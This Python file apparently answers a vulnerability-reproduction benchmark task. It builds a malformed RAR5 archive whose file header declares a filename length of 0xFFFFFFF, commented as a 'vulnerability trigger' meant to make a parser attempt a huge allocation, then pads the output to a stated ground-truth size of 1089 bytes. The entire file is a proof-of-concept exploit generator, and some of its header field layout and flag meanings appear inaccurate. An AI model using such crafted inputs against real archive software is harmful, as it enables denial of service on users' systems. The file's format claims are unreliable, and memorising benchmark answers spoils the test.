import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 signature
        signature = b'Rar!\x1a\x07\x01\x00'
        
        # Create a minimal valid RAR5 archive with oversized filename
        # We'll craft a file header with a very large filename length
        
        # Header CRC (will be calculated later)
        header_crc = 0
        
        # Header size will be calculated
        header_size = 0
        
        # Header type: 2 = file header
        header_type = 2
        
        # Header flags: 0x0200 = has filename, 0x0400 = has extra
        # Also set flag to indicate archive is continued from previous volume
        # to avoid unpacking attempts
        header_flags = 0x0200 | 0x0400 | 0x0001
        
        # Pack header flags as variable length integer
        def pack_vint(value):
            result = bytearray()
            while True:
                b = value & 0x7F
                value >>= 7
                if value == 0:
                    result.append(b)
                    break
                else:
                    result.append(b | 0x80)
            return bytes(result)
        
        # Start building header data
        header_data = bytearray()
        
        # Add header type
        header_data.append(header_type)
        
        # Add header flags as vint
        header_data.extend(pack_vint(header_flags))
        
        # Add file size as vint (0 for no data)
        header_data.extend(pack_vint(0))
        
        # Add uncompressed size as vint (0)
        header_data.extend(pack_vint(0))
        
        # Add file attributes as vint (0)
        header_data.extend(pack_vint(0))
        
        # Add mtime as vint (0)
        header_data.extend(pack_vint(0))
        
        # Add CRC32 of file data (0 for no data)
        header_data.extend(struct.pack('<I', 0))
        
        # Add compression info (0 for no compression)
        header_data.extend(pack_vint(0))
        
        # Add host OS (0 = Windows)
        header_data.append(0)
        
        # Here's the vulnerability trigger:
        # Add filename length as vint - use a very large value
        # 0xFFFFFFF is large enough to trigger excessive allocation
        filename_length = 0xFFFFFFF
        header_data.extend(pack_vint(filename_length))
        
        # Add actual filename (short, but the parser will try to allocate huge buffer)
        # The parser reads filename_length first, allocates buffer, then reads filename
        # Only after reading checks if filename_length is reasonable
        actual_filename = b"exploit.txt"
        header_data.extend(actual_filename)
        
        # Now we have the header data, calculate header size
        # Header size includes: 4 bytes CRC + size of header_size field + header_data
        # First pack header_size as vint
        total_header_size = 4 + len(pack_vint(0)) + len(header_data)
        # We'll recalculate after we know the actual packed size
        header_size_bytes = pack_vint(total_header_size)
        total_header_size = 4 + len(header_size_bytes) + len(header_data)
        
        # Update header_size_bytes with correct total
        header_size_bytes = pack_vint(total_header_size)
        
        # Calculate CRC32 of the header (without the CRC field itself)
        crc_data = header_size_bytes + header_data
        import zlib
        header_crc = zlib.crc32(crc_data) & 0xFFFFFFFF
        
        # Build final header
        header = struct.pack('<I', header_crc) + header_size_bytes + header_data
        
        # Build the complete archive
        archive = signature + header
        
        # Ground truth length is 1089 bytes, so pad if necessary
        # but our PoC should be close to that size
        if len(archive) < 1089:
            # Add extra data to reach approximate target size
            # Use additional headers or padding
            extra = b'\x00' * (1089 - len(archive))
            archive += extra
        elif len(archive) > 1089:
            # Trim if too long (shouldn't happen)
            archive = archive[:1089]
        
        return archive